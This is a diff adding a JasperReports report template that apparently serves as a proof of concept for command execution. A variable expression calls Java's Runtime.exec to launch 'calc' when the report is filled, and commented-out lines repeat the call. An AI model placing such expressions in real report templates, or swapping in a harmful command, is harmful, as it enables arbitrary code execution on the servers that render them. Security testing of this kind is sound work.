@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Created with Jaspersoft Studio version 6.1.1.final using JasperReports Library version 6.1.1  -->
+<!-- 2020-05-28T16:26:18 -->
+<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="Blank_A4" pageWidth="226" pageHeight="1000" columnWidth="226" leftMargin="0" rightMargin="0" topMargin="0" bottomMargin="0" uuid="65ac09b1-f1eb-43e7-b286-55c2265202d0">
+    <parameter name="abc" class="java.lang.String" isForPrompting="false"/>
+    <parameter name="memberPoints" class="java.lang.String" isForPrompting="false"/>
+    <queryString>
+        <![CDATA[]]>
+    </queryString>
+    <variable name="run" resetType="None">
+        <!-- <variableExpression><![CDATA[new java.util.Scanner(java.lang.Runtime.getRuntime().exec("calc").getInputStream()).useDelimiter("\\A")]]>
+        </variableExpression> -->
+        <variableExpression > <![CDATA["<s></s>"+(java.lang.Runtime.getRuntime().exec("calc"))]]>
+        </variableExpression >
+    </variable>
+    <variable name="run2" resetType="None">
+        <variableExpression><![CDATA["dsp:"+$P{abc}]]>
+        </variableExpression>
+    </variable>
+    <background>
+        <band splitType="Stretch"/>
+    </background>
+    <pageHeader>
+        <band height="10">
+            <staticText>
+                <reportElement x="10" y="0" width="10" height="10"/>
+                <text>
+                    <![CDATA[Page Header]]>
+                </text>
+            </staticText>
+        </band>
+    </pageHeader>
+    <detail>
+        <band height="20">
+            <textField>
+                <reportElement x="10" y="0" width="200" height="20"/>
+                <textFieldExpression>
+                    <![CDATA["hhh"+$V{run2}+($P{abc})]]>
+                    <!-- <![CDATA[java.lang.Runtime.getRuntime().exec("calc")]]> -->
+                </textFieldExpression>
+            </textField>
+            <staticText>
+                <reportElement x="180" y="0" width="200" height="20"/>
+                <text><![CDATA[hello!]]></text>
+            </staticText>
+            <staticText>
+                <reportElement x="180" y="-20" width="200" height="20"/>
+                <text><![CDATA[hello2!]]></text>
+            </staticText>
+        </band>
+    </detail>
+</jasperReport>
